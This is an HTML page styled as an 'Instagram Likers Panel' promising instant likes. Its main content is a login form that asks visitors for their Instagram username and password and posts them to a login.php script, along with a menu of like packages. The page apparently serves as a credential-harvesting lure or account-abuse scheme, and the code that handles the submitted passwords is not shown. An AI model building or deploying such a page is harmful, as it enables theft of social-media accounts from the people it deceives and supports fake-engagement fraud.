<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8" />
    <title>Instagram Likers Panel</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
<link rel="shortcut icon" href="http://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" />
	  <link rel="stylesheet" href="./style/bootstrap.min.css">
  <script src="./style/jquery.min.js"></script>
  <script src="./style/bootstrap.min.js"></script>
</head>
<body>

<div class="container">

<div class="page-header">
      <big><h3> Instagram Likers Panel </h3></big> <h2>Get Your Instant Likers with this panel</h2>
</div>

<!-- IPad Login - START -->
<div class="container">
    <div class="row colored">
        <div class="contcustom">
            <img src="http://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Smiley face" width="70" height="70">
              <big><h3>Get your Likers</h3></big>
                <div>
                    <form action="./login.php" method="post">
                        <input name="user" type="text" placeholder="Username ( use@ )" required="required"><br/>
    		            <input name="password" type="password" placeholder="Password" required="required"><br/>
                            <select class="form-control" name="salsakp">
                              <option value="10">499 Likers/post</option>
                              <option value="25">999 Likers/post</option>
                              <option value="50">1499 Likers/post</option>
                            </select><br/>
                        <input class="btn btn-success" type="submit" value="Send!">
                    </form>
                </div> 
            <div class="collapse" id="bukacoeg">
        		<center><div id="respon"></div><br/></center>
        	</div>
        </div>
	</div> 
</div>

<style>
    body {
        background: url("pic.jpg") ; 
        background-size: cover;
    }
    
    .row {
        padding: 20px 0px;
    }

    .bigicon {
        font-size: 97px;
        color: #f96145;
    }

    .contcustom {
        text-align: center;
        width: 280px;
        border-radius: 0.5rem;
        top: 0;
        bottom: 0;
        left: 0;
        right: 0;
        margin: 10px auto;
        background-color: none;
        padding: 20px;
    }

    input {
        width: 90%;
        margin-bottom: 15px;
        padding: 15px;
        background-color: #dedfdb;
        border-radius: 2px;
        border: none;
    }
    
    h1 {
        color: white;
    }
   
    h2 {
        margin-bottom: 20px;
        font-weight: bold;
        color: #ABABAB;
    }

    .btn {
        border-radius: 2px;
        padding: 10px;
    }

    .med {
        font-size: 27px;
        color: white;
    }

    .wide {
        background-color: #8EB7E4;
        width: 100%;
        -webkit-border-top-right-radius: 0;
        -webkit-border-bottom-right-radius: 0;
        -moz-border-radius-topright: 0;
        -moz-border-radius-bottomright: 0;
        border-top-right-radius: 0;
        border-bottom-right-radius: 0;
    }
    
</style>

</body>
</div>

</html>